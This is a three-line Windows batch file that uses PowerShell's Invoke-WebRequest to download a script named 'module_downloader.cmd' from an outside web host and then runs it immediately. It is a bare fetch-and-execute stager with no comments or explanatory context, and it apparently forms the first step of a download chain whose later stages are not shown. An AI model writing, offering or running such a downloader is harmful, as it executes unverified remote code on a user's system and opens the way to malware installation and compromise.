@echo off

powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/module_downloader.cmd' -OutFile module_downloader.cmd"
module_downloader.cmd